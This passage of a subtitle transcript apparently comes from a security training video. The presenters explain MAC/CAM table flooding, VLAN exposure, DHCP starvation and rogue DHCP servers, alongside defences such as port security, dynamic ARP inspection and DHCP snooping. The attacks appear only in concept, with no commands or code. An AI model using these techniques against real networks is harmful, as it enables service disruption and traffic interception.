or\n\n171\n00:07:10.540 --> 00:07:13.780\na swap file?\n\n172\n00:07:13.780 --> 00:07:14.900\n&gt;&gt; There you go, thank you very much.\n\n173\n00:07:14.900 --> 00:07:17.020\nI was gonna say swipe file,\nbut I knew that wasn't right.\n\n174\n00:07:17.020 --> 00:07:19.590\nA swap file,\nbecause we're not using hard drives.\n\n175\n00:07:19.590 --> 00:07:21.810\nThere's no hard drives on\nboard on these devices, right?\n\n176\n00:07:21.810 --> 00:07:23.390\nSo it's all dynamic memory.\n\n177\n00:07:23.390 --> 00:07:27.400\nWhich means that if we run out of space,\nwe start to have a problem.\n\n178\n00:07:27.400 --> 00:07:30.740\nAnd I mentioned this in the first episode\nof this series, we were talking about this\n\n179\n00:07:30.740 --> 00:07:33.510\nthat we could attack a switch,\nessentially, right, through flooding it.\n\n180\n00:07:33.510 --> 00:07:36.050\nWe talked about sin flooding,\nand different kinds of flood.\n\n181\n00:07:36.050 --> 00:07:37.890\nMac address floods, ARP floods.\n\n182\n00:07:37.890 --> 00:07:40.007\nSo if we attacked a switch by flooding it,\n\n183\n00:07:40.007 --> 00:07:44.058\nreferencing information that must be\nrecorded into the CAM tables so quickly,\n\n184\n00:07:44.058 --> 00:07:46.602\nthat we fill it up and\nessentially run out of room.\n\n185\n00:07:46.602 --> 00:07:49.916\nWhat happens is the switch fails\nopen is what we would say, and\n\n186\n00:07:49.916 --> 00:07:52.103\nit becomes a dumb connectivity device.\n\n187\n00:07:52.103 --> 00:07:54.144\nEssentially a layer one device, a hub.\n\n188\n00:07:54.144 --> 00:07:57.009\nSo we're modifying\nthe functionality of this hardware.\n\n189\n00:07:57.009 --> 00:08:00.973\nBy attacking its ability to reference\ninformation, record it, and\n\n190\n00:08:00.973 --> 00:08:03.660\nuse it, to move traffic back and forth.\n\n191\n00:08:03.660 --> 00:08:04.863\nKind of interesting when\nyou think about it.\n\n192\n00:08:04.863 --> 00:08:09.071\n&gt;&gt; It's fascinating, and it really plays\na big part into what we're talking about.\n\n193\n00:08:09.071 --> 00:08:09.853\n&gt;&gt; Fascinating?\n\n194\n00:08:09.853 --> 00:08:11.840\n&gt;&gt; I think it's fascinating,\nwell, maybe interesting.\n\n195\n00:08:11.840 --> 00:08:14.080\nBut like we were talking about earlier,\n\n196\n00:08:14.080 --> 00:08:17.460\nwe can put our network adapter in\npromiscuous mode, which means hey,\n\n197\n00:08:17.460 --> 00:08:20.590\nwe can capture all these traffic,\neven if it's not destined for me.\n\n198\n00:08:20.590 --> 00:08:24.830\nBut if I'm on a switched ethernet,\nthe switch is filtering the traffic, and\n\n199\n00:08:24.830 --> 00:08:28.920\nonly putting the traffic bound for\nme out that port and all of the sudden,\n\n200\n00:08:28.920 --> 00:08:30.550\nit didn't matter whether you\nuse promiscuous mode or not.\n\n201\n00:08:30.550 --> 00:08:32.000\nBecause I'm still just\ngonna see the traffic, so\n\n202\n00:08:32.000 --> 00:08:34.210\nnow I've got to do\nsomething to that switch.\n\n203\n00:08:34.210 --> 00:08:37.500\n&gt;&gt; Absolutely and so you know this\nis the way that we actually engage.\n\n204\n00:08:37.500 --> 00:08:39.930\nNow we're going to be talking about and\n\n205\n00:08:39.930 --> 00:08:43.540\nshowing you this in future episodes in\nthe denial of service conversations\n\n206\n00:08:43.540 --> 00:08:46.560\nwhere we do some sin flooding,\nwe'll take a look at how sin flood.\n\n207\n00:08:46.560 --> 00:08:48.430\nWhich are actually very simple to execute,\n\n208\n00:08:48.430 --> 00:08:51.910\ncan be executed to the affect you'll\nsee in terms of the traffic monitor.\n\n209\n00:08:51.910 --> 00:08:55.220\nWe'll see all that traffic coming in and\nstuff like that so,\n\n210\n00:08:55.220 --> 00:08:58.670\nany time we put something in front\nof the word flooding or an attack,\n\n211\n00:08:58.670 --> 00:09:02.760\nthat indicates that we're sending\nvoluminous amounts of traffic in packets,\n\n212\n00:09:02.760 --> 00:09:05.320\neither through a denial or\ndistributed denial of service event,\n\n213\n00:09:05.320 --> 00:09:09.740\none on one DoS,\nmany on one distributed denial of service.\n\n214\n00:09:09.740 --> 00:09:14.400\nWhen we do that, we potentially,\nif we are targeting routing and switching\n\n215\n00:09:14.400 --> 00:09:18.550\ninfrastructure have to always worry about\nthe fact that this may be the outcome.\n\n216\n00:09:18.550 --> 00:09:22.750\nRemember, if we're stepping up a layer in\nthe OSI model and theoretically switching,\n\n217\n00:09:22.750 --> 00:09:26.780\nright, from a switch to a router as\nwe do that in terms of moving data,\n\n218\n00:09:26.780 --> 00:09:29.480\nwe still have to worry about\nflooding attacks in routers.\n\n219\n00:09:29.480 --> 00:09:32.102\nBut they're for different reasons\nfrom different perspectives.\n\n220\n00:09:32.102 --> 00:09:36.192\nAnd we have more capabilities and\nmore security that we can turn on on\n\n221\n00:09:36.192 --> 00:09:40.520\nrouters in order to prevent this\nkind of concerning behavior, right?\n\n222\n00:09:40.520 --> 00:09:43.820\nBut we have to understand that\ndepending on the make of the router.\n\n223\n00:09:43.820 --> 00:09:46.520\nAnd depending on what it is,\nwe may be able to, for instance,\n\n224\n00:09:46.520 --> 00:09:48.370\nset up DHCP snooping.\n\n225\n00:09:48.370 --> 00:09:51.340\nCisco supports this,\nright, in their iOS's, so\n\n226\n00:09:51.340 --> 00:09:54.450\nthat we can actually monitor certain\nkinds of traffic that would be a problem.\n\n227\n00:09:54.450 --> 00:10:01.065\nWe can also go in, for instance, and\nagain in Cisco, take a look at DIA right?\n\n228\n00:10:01.065 --> 00:10:03.285\nSo we can do dynamic,\nyou know what DIA is?\n\n229\n00:10:03.285 --> 00:10:03.905\n&gt;&gt; I do not.\n\n230\n00:10:03.905 --> 00:10:07.325\n&gt;&gt; Dynamic ARP inspection,\nor I could have say, DARPI,\n\n231\n00:10:07.325 --> 00:10:08.505\nwhich would have given your way.\n\n232\n00:10:08.505 --> 00:10:12.588\nI have to had somebody say to me once do\nyou do that DARPI thing on that switch?\n\n233\n00:10:12.588 --> 00:10:13.265\nCan you do that?\n\n234\n00:10:13.265 --> 00:10:14.551\nI said,\nI have no idea what you're talking about.\n\n235\n00:10:14.551 --> 00:10:17.878\nYou know, that whole dynamic ARP,\nyou mean DAI, dynamic ARP inspection?\n\n236\n00:10:17.878 --> 00:10:21.144\nYeah, we do have that capability,\nwe do support that, so,\n\n237\n00:10:21.144 --> 00:10:23.526\nwe actually do have capabilities, right?\n\n238\n00:10:23.526 --> 00:10:26.159\nWhere we may be able to set some of\nthis stuff up, either at the switch or\n\n239\n00:10:26.159 --> 00:10:29.400\nthe router, just depends on the kind of\ngear we're talking about or what it is.\n\n240\n00:10:29.400 --> 00:10:31.380\nWe'll talk more about\nsome of these things, but\n\n241\n00:10:31.380 --> 00:10:35.010\nthe reality is there's lots of ways to\nprotect against some of these attacks, but\n\n242\n00:10:35.010 --> 00:10:38.505\nwe have to be aware of the fact\nthey're happening, number one.\n\n243\n00:10:38.505 --> 00:10:41.648\nAnd we have to be aware of\nthe fact that when they do happen,\n\n244\n00:10:41.648 --> 00:10:43.780\nwe have to be prepared to address them.\n\n245\n00:10:43.780 --> 00:10:48.573\nThis is a fundamental issue for us as a\nsecurity professionals, as practitioners,\n\n246\n00:10:48.573 --> 00:10:52.621\nas architects, and managers, as anything\nany of us are any of you are or\n\n247\n00:10:52.621 --> 00:10:57.007\nthat you may want to become over time as\nyou go through this kind of training and\n\n248\n00:10:57.007 --> 00:11:00.247\nultimately decide you may\npursue certification here and\n\n249\n00:11:00.247 --> 00:11:01.560\nyou know other areas.\n\n250\n00:11:01.560 --> 00:11:03.420\nWhether it's security class, it's casp,\n\n251\n00:11:03.420 --> 00:11:06.520\nit's CISSP it's who knows\nwhat whatever it is.\n\n252\n00:11:06.520 --> 00:11:10.140\nYou have to understand that applying\nthis knowledge in the real world\n\n253\n00:11:10.140 --> 00:11:13.070\nis part of the practical hey\nnow I know what to do but\n\n254\n00:11:13.070 --> 00:11:15.340\nhow do I do it and\nwhat do I really use it for conversation.\n\n255\n00:11:15.340 --> 00:11:18.260\nAnd we talked about this\nin certain places before.\n\n256\n00:11:18.260 --> 00:11:20.580\nWhere I've said it's great\nto see how it's done,\n\n257\n00:11:20.580 --> 00:11:23.890\nbecause you have to understand,\nthat it's not just the theory.\n\n258\n00:11:23.890 --> 00:11:25.789\nIt's nice to see that you can go in and\n\n259\n00:11:25.789 --> 00:11:28.734\nexecute; and ARP scan and\nlook for inbound ARP attacks,\n\n260\n00:11:28.734 --> 00:11:32.558\nlike we showed you in the last episode\nwhere we took a look at XARP, right?\n\n261\n00:11:32.558 --> 00:11:34.090\nFor instance, as a tool.\n\n262\n00:11:34.090 --> 00:11:38.740\nAnd we wanna understand that scanning\nhelps us to be proactively aware\n\n263\n00:11:38.740 --> 00:11:39.440\nof what's happening.\n\n264\n00:11:39.440 --> 00:11:42.840\nSo things like Mac floods are really\njust flooding the cam table\n\n265\n00:11:42.840 --> 00:11:46.430\nwith fake Mac addresses and\nIP pairs until we overload it.\n\n266\n00:11:46.430 --> 00:11:47.720\nThink of it as just a very,\n\n267\n00:11:47.720 --> 00:11:51.450\nvery simplistic form of buffer overflow\nbecause that's really all it is.\n\n268\n00:11:51.450 --> 00:11:55.060\nWe're overflowing memory spaces,\nbuffers essentially in memory\n\n269\n00:11:55.060 --> 00:11:58.890\nthat are processed or rather programmed to\nhold a certain amount of information and\n\n270\n00:11:58.890 --> 00:12:02.800\nonce we fill that buffer, there's\nnowhere for that information to go.\n\n271\n00:12:02.800 --> 00:12:07.510\nWe keep pouring stuff in essentially we\nwind up with a puddle of Mac address-like\n\n272\n00:12:07.510 --> 00:12:10.430\ninformation, and\nthe switch begins to act like a hub.\n\n273\n00:12:10.430 --> 00:12:12.520\nAnd when that happens we have problems,\n\n274\n00:12:12.520 --> 00:12:16.430\nbecause a switch acting like a hub is\ngoing to expose the VLANs for instance.\n\n275\n00:12:16.430 --> 00:12:19.200\nThis is how we do all\nsorts of VLAN attacks,\n\n276\n00:12:19.200 --> 00:12:22.400\nthis is what we do in virtual environments\nto attack VLAN infrastructure.\n\n277\n00:12:22.400 --> 00:12:25.030\nIn virtual switches,\nif we can flood the switch And\n\n278\n00:12:25.030 --> 00:12:30.230\nwe're able to propagate that attack, we\nexpose all VLANs and may expose by the way\n\n279\n00:12:30.230 --> 00:12:34.250\nother virtual environments that\nare connected in a multi-tenant situation.\n\n280\n00:12:34.250 --> 00:12:37.790\nCould be very problematic in virtual\nsystems, so just want to know that and\n\n281\n00:12:37.790 --> 00:12:39.970\nobviously there are tools\nthat let us do this.\n\n282\n00:12:39.970 --> 00:12:42.270\nWe could steal ports of the switch,\n\n283\n00:12:42.270 --> 00:12:46.300\nessentially another sniffing\ntechnique that will use map flooding\n\n284\n00:12:46.300 --> 00:12:49.560\nto be able to do this; to see what ports\nare in play what's mapped to what.\n\n285\n00:12:49.560 --> 00:12:53.740\nJust again, reading information\nfrom this particular solutions,\n\n286\n00:12:53.740 --> 00:12:58.400\nwe talked about defending against\nthese attacks by using port security,\n\n287\n00:12:58.400 --> 00:13:01.210\nit depends on the kind of\nswitches you're running.\n\n288\n00:13:01.210 --> 00:13:04.502\nWe assume and we often talk in\ngeneralities, we assume that the whole\n\n289\n00:13:04.502 --> 00:13:07.757\nworld use Cisco, I hope pretty soon\nthe whole world run Cisco gear.\n\n290\n00:13:07.757 --> 00:13:09.839\n&gt;&gt; [LAUGH]\n&gt;&gt; Not everybody goes, I know that, but\n\n291\n00:13:09.839 --> 00:13:10.890\na lot of people do.\n\n292\n00:13:10.890 --> 00:13:13.680\nThat's certainly on Cisco as I\nmentioned just a minute ago,that we\n\n293\n00:13:13.680 --> 00:13:15.470\ncould do DAAI, right.\n\n294\n00:13:15.470 --> 00:13:18.550\nWe could do DHCP inspection,\nwe could do port security.\n\n295\n00:13:18.550 --> 00:13:21.887\nWe could enable port security through\nthe IOS right, so we could go in and\n\n296\n00:13:21.887 --> 00:13:24.748\ndo that and it's obviously a very\ngood first line of defense.\n\n297\n00:13:24.748 --> 00:13:28.750\nBut whatever switch you use,\nwhatever brand you use.\n\n298\n00:13:28.750 --> 00:13:32.420\nWhatever that version of that\ncommand is to enable port security,\n\n299\n00:13:32.420 --> 00:13:33.620\nthat's what you would look for.\n\n300\n00:13:33.620 --> 00:13:36.060\nAnd, every major switch vendor,\ntoday, is gonna support this,\n\n301\n00:13:36.060 --> 00:13:38.150\nit's just a question of how\nthey implement it, right?\n\n302\n00:13:38.150 --> 00:13:40.710\nIt's one of those fundamental things\nthat we can use to essentially\n\n303\n00:13:40.710 --> 00:13:43.350\nrestrict inbound traffic,\nby using port security.\n\n304\n00:13:43.350 --> 00:13:47.410\nBecause we're only going to allow\na selected set of Mac addresses\n\n305\n00:13:47.410 --> 00:13:49.450\nto be able to talk, or interact, right.\n\n306\n00:13:49.450 --> 00:13:53.470\nSo, this is very selective mapping,\nif you will, of open connections and\n\n307\n00:13:53.470 --> 00:13:56.270\nallowing certain systems\nto connect as a result.\n\n308\n00:13:56.270 --> 00:13:57.930\nSo I want us to be thinking about this,\nright.\n\n309\n00:13:57.930 --> 00:14:02.710\nMac attacks can be very problematic,\nwe were talking about DHCP.\n\n310\n00:14:02.710 --> 00:14:04.320\nMike and I were just a little bit.\n\n311\n00:14:04.320 --> 00:14:07.510\nAnd this is another area that we have\nto focus on or really be aware of.\n\n312\n00:14:07.510 --> 00:14:08.870\nSo when we think about DHCP, right?\n\n313\n00:14:08.870 --> 00:14:13.210\nThe classic either ROSA or\nDORA discussion, right?\n\n314\n00:14:13.210 --> 00:14:17.160\nDiscover, offer, request, acknowledge, or\nrequest, offer, selection, acknowledge.\n\n315\n00:14:17.160 --> 00:14:19.980\nThe DHCP sisters,\nas we often refer to them.\n\n316\n00:14:19.980 --> 00:14:25.340\nAnd so when we think about how we're\ngonna send information back and forth.\n\n317\n00:14:25.340 --> 00:14:29.928\nThis is broadcast traffic almost for the\nentire duration of this initial, initial,\n\n318\n00:14:29.928 --> 00:14:32.938\nvery important distinction,\ninitial conversation.\n\n319\n00:14:32.938 --> 00:14:36.165\nUntil we hit the acknowledgement\nstage in stage four.\n\n320\n00:14:36.165 --> 00:14:40.652\nWhen we do that and we accept the IP at\nthe endpoint it's recorded at the server\n\n321\n00:14:40.652 --> 00:14:44.046\nthen we are broadcasting no more,\nnow we are unicasting.\n\n322\n00:14:44.046 --> 00:14:46.512\nWe are sending Information directly.\n\n323\n00:14:46.512 --> 00:14:51.085\nAnd then when we go to renew if we have\nnot expired, the TTL has not hit zero,\n\n324\n00:14:51.085 --> 00:14:55.516\nwe're at half TTL at seven-eighths TTL,\nwhatever those benchmarks or\n\n325\n00:14:55.516 --> 00:14:59.295\nmarkers would be on the highway\ntowards losing our address and\n\n326\n00:14:59.295 --> 00:15:01.792\nwinding up with an PIPPA based address.\n\n327\n00:15:01.792 --> 00:15:05.330\nAnd orb, no address at all,\nwhatever that happens to be.\n\n328\n00:15:05.330 --> 00:15:09.760\nWe are broadcasting, no, not broadcasting,\nwe are unicasting, trying to renew.\n\n329\n00:15:09.760 --> 00:15:13.090\nAnd so we wanna make sure we\nunderstand the kinda traffic, right?\n\n330\n00:15:13.090 --> 00:15:14.742\nBroadcast, unicast, multicast,\n\n331\n00:15:14.742 --> 00:15:17.205\nvery important to understand\nthree kinds of traffic.\n\n332\n00:15:17.205 --> 00:15:18.284\nUnicast one to one,\n\n333\n00:15:18.284 --> 00:15:22.732\ndirect to communication based on known\nendpoints with established IP addresses,\n\n334\n00:15:22.732 --> 00:15:26.110\nbroadcast one to everybody whether\nthey want to hear it or not.\n\n335\n00:15:26.110 --> 00:15:30.460\nYou stand up in a room, scream hey\nI'm Mike, and I wanna be your friend and\n\n336\n00:15:30.460 --> 00:15:33.640\neverybody in the room hears you whether\nMike's interested in meeting you or not.\n\n337\n00:15:33.640 --> 00:15:36.500\nAnd if it's a multicast\ntransmission it's one to a group.\n\n338\n00:15:36.500 --> 00:15:41.236\nA multicast transmission would\nessentially be you doing streaming media,\n\n339\n00:15:41.236 --> 00:15:43.534\nyou doing desktop imaging, right?\n\n340\n00:15:43.534 --> 00:15:47.303\nSo something like Windows deployment\nservices or ghost or whatever it is we use\n\n341\n00:15:47.303 --> 00:15:50.170\nmulticasting addresses to be\nable to do that, right, so.\n\n342\n00:15:50.170 --> 00:15:52.524\nKeep in mind that we should have a basic,\n\n343\n00:15:52.524 --> 00:15:56.132\nfundamental knowledge of\nthe prerequisites of networking,\n\n344\n00:15:56.132 --> 00:16:01.070\nkind of what we would call network plus or\nnetworking 101 kind of information.\n\n345\n00:16:01.070 --> 00:16:02.740\nVery important to understand\nthe traffic types,\n\n346\n00:16:02.740 --> 00:16:06.095\nimportant to understand\nthe structures of IP addresses,\n\n347\n00:16:06.095 --> 00:16:10.990\n32-bit IPv4 address,\na subnet, a default gateway.\n\n348\n00:16:10.990 --> 00:16:12.030\nHow do these things work?\n\n349\n00:16:12.030 --> 00:16:13.450\nWhy are they important?\n\n350\n00:16:13.450 --> 00:16:17.200\nVery basic concepts that we kinda gloss\nover sometimes in our conversations.\n\n351\n00:16:17.200 --> 00:16:20.130\nWe assume, right,\nthat you will be comfortable with them.\n\n352\n00:16:20.130 --> 00:16:23.074\nBut we always try to at least throw them\nout there and give you a quick primer on\n\n353\n00:16:23.074 --> 00:16:25.894\nthem when we're talking about them\nin relation to something like DHCP.\n\n354\n00:16:25.894 --> 00:16:28.508\nSo I wanna make sure you're comfortable\nwith where we're going with\n\n355\n00:16:28.508 --> 00:16:29.625\nthe conversation, right?\n\n356\n00:16:29.625 --> 00:16:33.407\nAnd so as we talk about those four stages\nand we talk about how we're moving\n\n357\n00:16:33.407 --> 00:16:36.518\ninformation back and forth,\nif it's broadcast traffic and\n\n358\n00:16:36.518 --> 00:16:40.605\nultimately we're looking to get an IP\naddress, we have to understand that that\n\n359\n00:16:40.605 --> 00:16:44.570\ninformation can be problematic if we're\nnot protecting and not scanning for\n\n360\n00:16:44.570 --> 00:16:47.332\nthat traffic and\nmarking it appropriately, right?\n\n361\n00:16:47.332 --> 00:16:50.030\nBecause broadcast storms\ncan take down networks.\n\n362\n00:16:50.030 --> 00:16:54.190\nAnd while we do propagate DHCP broadcast\ntraffic on most routers today,\n\n363\n00:16:54.190 --> 00:16:57.060\nboot P traffic in other words,\nright, we call it Bootstrap traffic.\n\n364\n00:16:57.060 --> 00:17:00.345\nWe do that RC154\n&gt;&gt; 2.\n\n365\n00:17:00.345 --> 00:17:01.459\n&gt;&gt; 154?\n\n366\n00:17:01.459 --> 00:17:03.714\n&gt;&gt; 3.\n&gt;&gt; 154, [LAUGH] I'm only kidding.\n\n367\n00:17:03.714 --> 00:17:04.413\n&gt;&gt; 1542, isn't it?\n\n368\n00:17:04.413 --> 00:17:05.691\n&gt;&gt; Yeah, it's RC1542.\n\n369\n00:17:05.691 --> 00:17:07.943\n&gt;&gt; [LAUGH]\n&gt;&gt; I was just messing with you.\n\n370\n00:17:07.943 --> 00:17:11.379\nEvery so often, it's fun, he's like, wait,\nI thought that was, isn't that what it is?\n\n371\n00:17:11.379 --> 00:17:12.636\n&gt;&gt; Makes me question myself.\n\n372\n00:17:12.636 --> 00:17:15.430\n[LAUGH]\n&gt;&gt; So remember, if you know it, right,\n\n373\n00:17:15.430 --> 00:17:18.160\nthen you're supposed to say that's what\nit is, and I know that's what it is.\n\n374\n00:17:18.160 --> 00:17:21.160\nAnd so, just remember when we\nthink about this kind of stuff,\n\n375\n00:17:21.160 --> 00:17:23.130\nwe program in the supported routers,\nright?\n\n376\n00:17:23.130 --> 00:17:26.994\nAnd we know that natively today, these\nrouters will propagate this traffic and,\n\n377\n00:17:26.994 --> 00:17:28.735\nor we use a DHCP relay agent, right?\n\n378\n00:17:28.735 --> 00:17:32.860\nWe're not gonna go through the whole, hey,\nI'm DHCP, how do I work conversation, but\n\n379\n00:17:32.860 --> 00:17:36.436\njust understanding, right, that this\nis essentially regulated traffic of\n\n380\n00:17:36.436 --> 00:17:39.035\na very special class,\nwhich is why we allow it through.\n\n381\n00:17:39.035 --> 00:17:40.946\nBut normal broadcast traffic is dropped,\n\n382\n00:17:40.946 --> 00:17:44.310\nwe do not propagate that traffic on\npurpose because of security concerns.\n\n383\n00:17:44.310 --> 00:17:46.140\nSo wanna make sure we're aware of that.\n\n384\n00:17:46.140 --> 00:17:47.970\nObviously, we wanna think about that.\n\n385\n00:17:47.970 --> 00:17:50.310\nKeep in mind also,\njust as an aside quickly,\n\n386\n00:17:50.310 --> 00:17:54.580\nthat DHCP on IPv4 is the traditional\nway we've described it,\n\n387\n00:17:54.580 --> 00:17:58.880\nDORA or ROSA, the four step discover\noffer requested knowledge process.\n\n388\n00:17:58.880 --> 00:18:02.470\nOn v6, looks a little bit different,\nright?\n\n389\n00:18:02.470 --> 00:18:05.290\nWe talked about solicit, advertise.\n\n390\n00:18:05.290 --> 00:18:09.690\nYou can then in the third spot either\nsee request, confirm, renew, or remind.\n\n391\n00:18:09.690 --> 00:18:12.912\nSo there's multiple options there,\nand then we have reply.\n\n392\n00:18:12.912 --> 00:18:17.166\nSo essentially,\nyou're talking about SARR, S-A-R-R,\n\n393\n00:18:17.166 --> 00:18:21.625\nif you go with, let's say,\nrequest or renew or rebind, SACR.\n\n394\n00:18:21.625 --> 00:18:26.028\nS-A-C-R, if you do the solicit,\nadvertise, confirm, and reply, in theory,\n\n395\n00:18:26.028 --> 00:18:27.380\nin that third spot.\n\n396\n00:18:27.380 --> 00:18:29.180\nSo, it's the same concepts, but\n\n397\n00:18:29.180 --> 00:18:32.156\nthey're named differently and\nthey behave a little bit differently.\n\n398\n00:18:32.156 --> 00:18:34.080\nYou may wanna just take a note on that,\n\n399\n00:18:34.080 --> 00:18:36.290\nmaybe just go back,\ntake a look real quick.\n\n400\n00:18:36.290 --> 00:18:39.020\nThere's some nice comparison charts\nout there you can take a look at and\n\n401\n00:18:39.020 --> 00:18:43.320\nget a sense, but there are some\ndifferent structures and some different\n\n402\n00:18:43.320 --> 00:18:47.510\nfunctionalities with DHCP v6, and we're\nstarting to see that a little bit more.\n\n403\n00:18:47.510 --> 00:18:50.570\nWe're starting to see IPv6 in\ngeneral a little bit more, so\n\n404\n00:18:50.570 --> 00:18:54.150\nwe do wanna understand that,\nattacks that can be propagated here.\n\n405\n00:18:54.150 --> 00:19:00.630\nSo if we talked about, hypothetically,\nMike, kind of, what am I thinking of?\n\n406\n00:19:00.630 --> 00:19:02.930\nI can't think,\nwhich is why I can't come up with a name.\n\n407\n00:19:02.930 --> 00:19:05.270\nLet's just, off the top of our head,\nwhich is what I cannot do,\n\n408\n00:19:05.270 --> 00:19:08.150\ncuz I cannot think right now, let's\njust talk, hypothetically for a minute,\n\n409\n00:19:08.150 --> 00:19:11.580\nabout the ways in which we may attack\na DHCP server, or potentially,\n\n410\n00:19:11.580 --> 00:19:14.238\nuse DHCP to create\na denial of service event.\n\n411\n00:19:14.238 --> 00:19:17.120\nSo what would be things that may go wrong,\nif we're using DHCP and\n\n412\n00:19:17.120 --> 00:19:19.240\nwe see that DHCP is vulnerable?\n\n413\n00:19:19.240 --> 00:19:21.050\nWhat are some of the things\nwe wanna look at or look for?\n\n414\n00:19:21.050 --> 00:19:22.990\n&gt;&gt; One thing might be to\n\n415\n00:19:24.150 --> 00:19:28.250\ndo a denial of service on the DHCP\nserver itself because of all the nodes.\n\n416\n00:19:28.250 --> 00:19:31.150\nThey probably have a lease,\nbut any new nodes or\n\n417\n00:19:31.150 --> 00:19:34.520\nanybody that was trying to renew a lease\nwouldn't be able to get an IP address,\n\n418\n00:19:34.520 --> 00:19:36.420\nwhich means they wouldn't be able\nto communicate on the network.\n\n419\n00:19:36.420 --> 00:19:40.300\nSo one might be to bring the DHCP\nserver down or out of service.\n\n420\n00:19:40.300 --> 00:19:42.530\n&gt;&gt; Okay, and let's play off that riff for\njust a second.\n\n421\n00:19:42.530 --> 00:19:43.100\nSo it's a great one.\n\n422\n00:19:43.100 --> 00:19:44.720\nSo we actually have a formal name for\nthat.\n\n423\n00:19:44.720 --> 00:19:47.100\nWe call it DHCP starvation attack.\n\n424\n00:19:47.100 --> 00:19:51.230\nAnd so, what we mean there is essentially\nwe DOS the box like you said, taking away\n\n425\n00:19:51.230 --> 00:19:55.260\nthe resources that would allow us to\nlease and, or to give out information.\n\n426\n00:19:55.260 --> 00:19:59.520\nMaybe we are sending a bunch of SYN\npackets in, trying to do a SYN flood.\n\n427\n00:19:59.520 --> 00:20:03.890\nMaybe we are overwhelming the system\nby running multiple processes\n\n428\n00:20:03.890 --> 00:20:07.190\nkind of resource, a lot of ways\nwe could starve the DHCP server.\n\n429\n00:20:07.190 --> 00:20:09.947\nBut a starvation attack would essentially\nlead to a denial service of that,\n\n430\n00:20:09.947 --> 00:20:10.773\nlike you were saying.\n\n431\n00:20:10.773 --> 00:20:12.870\nAnd that's the formal name for\nit, by the way.\n\n432\n00:20:12.870 --> 00:20:15.000\nWe call it the DHCP starvation attack.\n\n433\n00:20:15.000 --> 00:20:18.614\n&gt;&gt; And a lot of people don't have enough\nroom, or I see sometimes that people don't\n\n434\n00:20:18.614 --> 00:20:21.607\nhave enough room in their scope,\nthey're cutting it very close.\n\n435\n00:20:21.607 --> 00:20:25.276\nAnd it wouldn't take that many VMs to spin\nup to eat up the last few addresses in\n\n436\n00:20:25.276 --> 00:20:28.276\ntheir pool, which will do another\nstarvation on them as well.\n\n437\n00:20:28.276 --> 00:20:29.389\n&gt;&gt; Yeah, it could, and you could.\n\n438\n00:20:29.389 --> 00:20:32.433\nAnother way you could deal with that\nwould be to simply drop the TTL value\n\n439\n00:20:32.433 --> 00:20:33.125\ndown, right.\n\n440\n00:20:33.125 --> 00:20:36.980\nSo we've had this issue in our offices\nbefore where we, on the classroom side,\n\n441\n00:20:38.220 --> 00:20:41.210\nright, you get these days, people walk in,\nthey've got three or four devices.\n\n442\n00:20:41.210 --> 00:20:43.340\nThey're there for a day or more for class,\n\n443\n00:20:43.340 --> 00:20:46.420\nand they're hooking everything up\nbecause nobody wants to, obviously,\n\n444\n00:20:46.420 --> 00:20:49.600\nrun on their data package when\nthey can run on wireless on yours.\n\n445\n00:20:49.600 --> 00:20:51.256\nWhen they're in the office so\nI get that, and\n\n446\n00:20:51.256 --> 00:20:53.928\nwe understand that on the classroom side,\nwe make provisions for that.\n\n447\n00:20:53.928 --> 00:20:56.608\nBut if you don't set a broad enough\nscope as you were suggesting,\n\n448\n00:20:56.608 --> 00:20:57.790\nthen you're gonna run out.\n\n449\n00:20:57.790 --> 00:21:00.170\nSo what we've done is\nwe've cut the TTL back, so\n\n450\n00:21:00.170 --> 00:21:05.160\nthat as devices leave, we're essentially\nrecouping those addresses quickly,\n\n451\n00:21:05.160 --> 00:21:07.382\nso you can manipulate\nvarious variables there.\n\n452\n00:21:07.382 --> 00:21:11.530\nAnd Mike makes a great point by thinking\nabout the fact that it wouldn't take much\n\n453\n00:21:11.530 --> 00:21:14.800\nto drop us essentially or\npush us over the edge, right?\n\n454\n00:21:14.800 --> 00:21:16.446\nWith regards to maybe having 5 or\n\n455\n00:21:16.446 --> 00:21:20.560\n10% available numbers in the scope if\nwe're not doing a super scope, but\n\n456\n00:21:20.560 --> 00:21:23.700\nwe have just very limited scope,\na few hundred machines, whatever it is.\n\n457\n00:21:23.700 --> 00:21:26.070\nThat could be a problem because\nif you're leasing addresses for\n\n458\n00:21:26.070 --> 00:21:29.900\nthe default amount of time,\nyou're giving them out for\n\n459\n00:21:29.900 --> 00:21:34.210\nnumerous numbers of days, and\nthen you'll have TTL before they respond.\n\n460\n00:21:34.210 --> 00:21:38.020\nYou may see those addresses sit fallow for\nfour days before they try to get recouped.\n\n461\n00:21:38.020 --> 00:21:41.620\nAnd that can be an issue if you've got\n3 or 400 people coming through a system\n\n462\n00:21:41.620 --> 00:21:45.480\nover the course of a week, and you've\nonly got a scope that covers 250 hosts.\n\n463\n00:21:45.480 --> 00:21:46.920\nYou're gonna run out of room.\n\n464\n00:21:46.920 --> 00:21:49.010\nRogue DHCP server attacks,\nyou didn't mention that one, but\n\n465\n00:21:49.010 --> 00:21:53.040\nthat would be another one, where we could\nset up a separate DHCP infrastructure.\n\n466\n00:21:53.040 --> 00:21:53.590\nAnd if we do that,\n\n467\n00:21:53.590 --> 00:21:57.820\nwe may take systems away from the core\nsubnets in the network by reassigning them\n\n468\n00:21:57.820 --> 00:22:01.420\ninto essentially a black hole where\nwe could then pick them off, right?\n\n469\n00:22:01.420 --> 00:22:04.160\nSo our own little shooting gallery,\npeople are running around in there.\n\n470\n00:22:04.160 --> 00:22:05.660\nNow that can be dealt with as well.\n\n471\n00:22:05.660 --> 00:22:08.580\nWe do authorize DHCP servers in Windows,\nfor instance.\n\n472\n00:22:08.580 --> 00:22:10.920\nSo we have rogue DHCP protection built in,\n\n473\n00:22:10.920 --> 00:22:13.780\nwhere you can't bring up\na server unless it's authorized.\n\n474\n00:22:13.780 --> 00:22:17.184\nBut you can bring up non-Microsoft\nbase here inside the servers.\n\n475\n00:22:17.184 --> 00:22:17.979\n&gt;&gt; Linux doesn't check with\nActive Directory, does it?\n\n476\n00:22:17.979 --> 00:22:20.233\n&gt;&gt; No, it doesn't do that.\n\n477\n00:22:20.233 --> 00:22:24.161\nAnd you can bring up old versions of\nWindows infrastructure running DHCP,\n\n478\n00:22:24.161 --> 00:22:26.650\nyou can run it on, you've spent anything.\n\n479\n00:22:26.650 --> 00:22:29.130\nYou can bring up a VM that's running\nit that's not domain joined.\n\n480\n00:22:29.130 --> 00:22:30.650\nSo it's not a perfect solution.\n\n481\n00:22:30.650 --> 00:22:32.780\nIt's just within the environment,\nobviously.\n\n482\n00:22:32.780 --> 00:22:33.830\nSo you wanna think about 